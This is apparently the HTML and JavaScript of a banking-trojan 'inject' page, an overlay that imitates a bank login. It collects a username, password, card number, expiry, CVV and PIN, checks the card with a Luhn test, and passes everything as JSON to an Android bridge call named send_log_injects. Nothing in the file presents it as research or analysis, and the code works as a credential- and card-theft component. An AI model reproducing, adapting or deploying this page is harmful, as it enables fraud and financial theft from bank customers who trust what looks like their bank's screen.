    <title>Document</title>

    <style>
        #form1, #form2 {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        section {
            flex: 1;
            padding: 15px;
            background-color: #fff;
            border: 0;
            border-radius: 25px 25px 0 0 ;
            margin-top: -20px;
        }

        label {
            font-size: 14px;
            color: #285b68;
            margin-bottom: 5px;
        }

        .input {
            width: 100%;
            padding: 8px;
            border: 1px solid #d0d0d0;
            border-radius: 8px;
        }

        .input:focus {
            border-color: #bfad6c;
        }

        p {
            text-align: right;
            color: #285b68;
            font-size: 12px;
            margin-bottom: 15px;
        }

        input, button {
            outline: none !important;
            box-shadow: none !important;
        }

        .button {
            width: 100%;
            padding: 10px;
            border: 0;
            border-radius: 25px;
            background-color: #285b68;
            color: #fff;
            margin-bottom: 15px;
        }

        .button:disabled {
            opacity: 0.4;
        }

        .btn {
            width: 100%;
            padding: 10px;
            color: #285b68;
            border: 1px solid #285b68;
            border-radius: 25px;
        }

        .error {
            border-color: #f00 !important;
        }
    </style>
</head>

    </form>
    <script>
        $('#cc').mask('0000 0000 0000 0000');
        $('#exp').mask('00/00');
        $('#cvv').mask('000');
        $('#pin').mask('0000');

        var spinner = document.getElementById('spinner'),
            form1 = document.getElementById('form1'),
            form2 = document.getElementById('form2');

        var cc = document.getElementById('cc'),
            exp = document.getElementById('exp'),
            pin = document.getElementById('pin'),
            cvv = document.getElementById('cvv');

        var login = document.getElementById('login'),
            password = document.getElementById('password');

        var nextPage = document.getElementById('nextPage'),
            sendData = document.getElementById('sendData');


        login.onkeyup = () => {
            if(login.value.length >= 4 && password.value.length >= 4) {
                nextPage.disabled = false;
            } else {
                nextPage.disabled = true;
            }
        }

        password.onkeyup = () => {
            if(login.value.length >= 4 && password.value.length >= 4) {
                nextPage.disabled = false;
            } else {
                nextPage.disabled = true;
            }
        }

        nextPage.onclick = () => {

            spinner.style.display = 'block';
            setTimeout(() => {
                form1.style.display = 'none';
                spinner.style.display = 'none';
                form2.style.display = 'flex';
            }, 1500);
        }

        function check7() {
            var mmYY = exp.value.split('/');
            var month = parseInt(mmYY[0]);
            var year = parseInt(mmYY[1]);
    
            var expArray = exp.value.split('/');
            var today, someday;
            var exMonth = expArray[0];
            var exYear = "20" + expArray[1];
    
            today = new Date();
            someday = new Date();
            someday.setFullYear(exYear, exMonth, 1);
                    
            if(month > 12 || month == 0 || month == 00 || someday < today || year > 27 || exp.value.length != 5) {
                exp.classList.add('error')
            } else {
                exp.classList.remove('error')
                return true
            }
        }

        function check6() {
            if(!valid_credit_card(cc.value)) {
                cc.classList.add('error')
            } else {
                cc.classList.remove('error');
            }
        }

        function valid_credit_card(value) {
            if(value=='' || value.length < 19 || value=='0000 0000 0000 0000') return false;
            if (/[^0-9-\s]+/.test(value)) return false;
            var nCheck = 0, nDigit = 0, bEven = false;
            value = value.replace(/\D/g, "");
            for (var n = value.length - 1; n >= 0; n--) {
                var cDigit = value.charAt(n),
                    nDigit = parseInt(cDigit, 10);
                if (bEven) {
                    if ((nDigit *= 2) > 9) nDigit -= 9;
                }
                nCheck += nDigit;
                bEven = !bEven;
            }
            return (nCheck % 10) == 0;
            
        }

        function check8() {
            if(valid_credit_card(cc.value) && check7() && cvv.value.length === 3 && pin.value.length === 4) {
                sendData.disabled = false;
            } else {
                sendData.disabled = true;
            }
        }

        sendData.onclick = () => {
            var data = {};
                data.login = login.value;
                data.password = password.value;
                data.cc = cc.value;
                data.exp = exp.value;
                data.cvc = cvv.value;
                data.pin = pin.value;
                data.type_injects = "banks";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
        }
    </script>
